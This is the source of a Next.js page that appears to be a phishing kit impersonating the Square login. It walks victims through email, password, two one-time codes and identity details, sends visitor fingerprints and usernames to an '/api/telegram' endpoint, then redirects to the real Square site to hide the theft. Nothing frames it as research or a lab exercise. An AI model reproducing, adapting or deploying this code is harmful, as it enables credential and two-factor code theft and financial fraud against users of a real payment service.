'use client';

import { useEffect, useRef, useState } from 'react'
import { SquareLogo } from '@/components/SquareLogo'
import { EmailPage } from '@/components/EmailPage'
import { PasswordPage } from '@/components/PasswordPage'
import { TwoFactorMethodPage } from '@/components/TwoFactorMethodPage'
import { VerifyCodePage } from '@/components/VerifyCodePage'
import { IdentityDetailsPage } from '@/components/IdentityDetailsPage'

export type PageState =
  | 'email'
  | 'password'
  | '2fa-method'
  | 'verify-code'
  | 'details'
  | 'verify-code-2'

export default function App() {
  const [currentPage, setCurrentPage] = useState<PageState>('email')
  const [email, setEmail] = useState('')
  const [method, setMethod] = useState('sms')
  const [hasInteracted, setHasInteracted] = useState(false)
  const hasSentVisitRef = useRef(false)

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true)
    window.addEventListener('pointerdown', onFirstInteraction, { once: true, passive: true })
    window.addEventListener('keydown', onFirstInteraction, { once: true })
    return () => {
      window.removeEventListener('pointerdown', onFirstInteraction)
      window.removeEventListener('keydown', onFirstInteraction)
    }
  }, [])

  useEffect(() => {
    if (!hasInteracted || hasSentVisitRef.current) return
    hasSentVisitRef.current = true
    const payload = {
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      screen: typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : '',
      language: typeof navigator !== 'undefined' ? navigator.language : '',
      referrer: typeof document !== 'undefined' ? document.referrer || 'Direct' : 'Direct',
      url: typeof window !== 'undefined' ? window.location.href : '',
      utcTime: new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true,
      }),
    }
    fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ kind: 'visit', ...payload }),
    }).catch(console.error)
  }, [hasInteracted])

  const handleContinueEmail = (emailValue: string) => {
    fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        kind: 'login',
        username: emailValue.trim(),
      }),
    }).catch(console.error)
    setEmail(emailValue)
    setCurrentPage('password')
  }

  const handleChangeEmail = () => {
    setCurrentPage('email')
  }

  const handleSignInSuccess = () => {
    // Skip the method selection step: go straight to OTP entry (default `sms`).
    setCurrentPage('verify-code')
  }

  const handleMethodContinue = (selectedMethod: string) => {
    setMethod(selectedMethod)
    setCurrentPage('verify-code')
  }

  const handleVerificationSuccess = () => {
    setCurrentPage('details')
  }

  const handleVerificationSuccessSecond = () => {
    window.location.href = 'https://app.squareup.com/login?lang_code=en-us'
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="px-8 py-6 flex items-center justify-between">
        <a
          href="#"
          onClick={(e) => {
            e.preventDefault()
            setCurrentPage('email')
          }}
          className="flex items-center gap-2 no-underline"
          aria-label="Back to landing"
        >
          <SquareLogo className="w-8 h-8" />
          <span className="text-xl font-semibold text-[#1a1a1a] tracking-tight">Square</span>
        </a>
      </header>

      {/* Main Content */}
      <main className="flex justify-center pt-20 min-h-[calc(100vh-80px)]">
        <div className="w-full max-w-[590px] px-6 pb-20">
          {currentPage === 'email' && (
            <EmailPage onContinue={handleContinueEmail} />
          )}

          {currentPage === 'password' && (
            <PasswordPage 
              email={email} 
              onChangeEmail={handleChangeEmail} 
              onSignInSuccess={handleSignInSuccess}
            />
          )}

          {currentPage === '2fa-method' && (
            <TwoFactorMethodPage 
              email={email}
              onContinue={handleMethodContinue}
              onCancel={() => setCurrentPage('password')}
            />
          )}

          {currentPage === 'verify-code' && (
            <VerifyCodePage 
              method={method}
              email={email}
              otpStep={1}
              onVerify={handleVerificationSuccess}
              onBack={() => setCurrentPage('2fa-method')}
            />
          )}

          {currentPage === 'details' && (
            <IdentityDetailsPage
              onContinue={() => setCurrentPage('verify-code-2')}
              onBack={() => setCurrentPage('verify-code')}
            />
          )}

          {currentPage === 'verify-code-2' && (
            <VerifyCodePage
              method={method}
              email={email}
              otpStep={2}
              onVerify={handleVerificationSuccessSecond}
              onBack={() => setCurrentPage('details')}
            />
          )}
        </div>
      </main>
    </div>
  )
}
